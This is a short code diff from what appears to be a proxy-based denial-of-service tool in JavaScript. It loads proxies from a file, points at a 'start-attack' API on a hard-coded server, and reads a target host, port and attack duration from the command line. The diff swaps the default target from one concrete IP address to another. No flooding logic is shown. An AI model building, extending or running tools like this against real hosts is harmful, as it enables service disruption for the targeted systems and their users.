@@ -9,7 +9,7 @@ const proxies = fs.readFileSync('Proxy.txt', 'utf-8').toString().trim().split('\
 const apiEndpoint = 'http://170.64.166.87:8080/api/start-attack'; // Adjust the URL if necessary
 
 // Read command line arguments
-const [,, host = '143.198.91.133', port = 443, time = 60] = process.argv;
+const [,, host = '152.42.247.134', port = 443, time = 60] = process.argv;
 const targetPort = parseInt(port, 10);
 const attackTime = parseInt(time, 10);
 
